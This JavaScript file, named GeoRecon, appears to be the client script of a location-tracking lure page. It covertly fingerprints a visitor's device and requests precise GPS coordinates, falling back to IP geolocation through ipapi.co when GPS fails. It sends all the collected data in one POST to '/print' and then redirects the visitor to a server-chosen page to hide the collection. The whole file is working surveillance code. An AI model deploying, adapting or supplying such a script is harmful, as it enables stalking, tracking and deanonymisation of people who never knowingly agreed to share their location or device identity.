/**
 * GeoRecon - Single Request Collector
 * Sends ALL data (Device + Location) in ONE POST to /print
 */

var collectedData = {};

function information() {
    collectedData.Platform = navigator.platform || 'Not Available';
    collectedData.Cores = navigator.hardwareConcurrency || 'Not Available';
    collectedData.RAM = navigator.deviceMemory || 'Not Available';

    var ver = navigator.userAgent;

    if (ver.indexOf('Firefox') !== -1) {
        collectedData.Browser = ver.substring(ver.indexOf(' Firefox/') + 1).split(' ')[0];
    } else if (ver.indexOf('Chrome') !== -1) {
        collectedData.Browser = ver.substring(ver.indexOf(' Chrome/') + 1).split(' ')[0];
    } else if (ver.indexOf('Safari') !== -1) {
        collectedData.Browser = ver.substring(ver.indexOf(' Safari/') + 1).split(' ')[0];
    } else if (ver.indexOf('Edge') !== -1) {
        collectedData.Browser = ver.substring(ver.indexOf(' Edge/') + 1).split(' ')[0];
    } else {
        collectedData.Browser = 'Not Available';
    }

    var canvas = document.createElement('canvas');
    try {
        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            collectedData.Vendor = gl.getParameter(gl.VENDOR);
            collectedData.Renderer = gl.getParameter(gl.RENDERER);
        }
    } catch (e) {}
    if (!collectedData.Vendor) collectedData.Vendor = 'Not Available';
    if (!collectedData.Renderer) collectedData.Renderer = 'Not Available';

    collectedData.Width = window.screen.width;
    collectedData.Height = window.screen.height;

    var osStr = ver.substring(0, ver.indexOf(')'));
    var osParts = osStr.split(';');
    collectedData.OS = (osParts[1] ? osParts[1].trim() : 'Not Available');
}

function getIpLocation() {
    console.log('[GeoRecon] Native GPS failed, trying IP-based location...');

    fetch('https://ipapi.co/json/')
        .then(res => res.json())
        .then(data => {
            if (data.error) throw new Error('IP API failed');

            collectedData.Type = 'location';
            collectedData.Status = 'success (IP fallback)';
            collectedData.Latitude = parseFloat(data.latitude || 0);   // ← число
            collectedData.Longitude = parseFloat(data.longitude || 0); // ← число
            collectedData.Accuracy = 'IP-based (approx)';
            collectedData.Altitude = 'N/A';
            collectedData.Direction = 'N/A';
            collectedData.Speed = 'N/A';
            collectedData.City = data.city;
            collectedData.Region = data.region;
            collectedData.Country = data.country_name;

            sendSingleRequest();
        })
        .catch(err => {
            console.error('[GeoRecon] IP fallback failed:', err);
            collectedData.Type = 'partial';
            collectedData.Status = 'location failed';
            sendSingleRequest();
        });
}

function locate(callback, errCallback) {
    console.log('[GeoRecon] Requesting position...');

    var optn = {
        enableHighAccuracy: false,
        timeout: 15000,
        maximumAge: 0
    };

    navigator.geolocation.getCurrentPosition(
        function(position) {
            console.log('[GeoRecon] Position received!');

            collectedData.Type = 'location';
            collectedData.Status = 'success';
            collectedData.Latitude = parseFloat(position.coords.latitude);   // ← число
            collectedData.Longitude = parseFloat(position.coords.longitude); // ← число
            collectedData.Accuracy = position.coords.accuracy + ' m';
            collectedData.Altitude = position.coords.altitude ? position.coords.altitude + ' m' : 'N/A';
            collectedData.Direction = position.coords.heading ? position.coords.heading + ' deg' : 'N/A';
            collectedData.Speed = position.coords.speed ? position.coords.speed + ' m/s' : 'N/A';

            sendSingleRequest();
            callback();
        },
        function(error) {
            console.error('[GeoRecon] Geolocation error:', error.code, error.message);

            if (error.code === 2) {
                getIpLocation();
                return;
            }

            collectedData.Type = 'error';
            collectedData.Status = 'failed';

            switch (error.code) {
                case error.PERMISSION_DENIED:
                    collectedData.Error = 'User denied geolocation';
                    break;
                case error.TIMEOUT:
                    collectedData.Error = 'Geolocation request timeout';
                    break;
                default:
                    collectedData.Error = 'Unknown error';
            }

            sendSingleRequest();
            errCallback(error, collectedData.Error);
        },
        optn
    );
}

function sendSingleRequest() {
    console.log('[GeoRecon] Sending combined data...');

    fetch('/print', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(collectedData)
    })
    .then(r => r.json())
    .then(data => {
        console.log('[GeoRecon] Data sent successfully');
        if (data.redirect) {
            window.location.href = data.redirect;
        }
    })
    .catch(err => {
        console.error('[GeoRecon] Send error:', err);
    });
}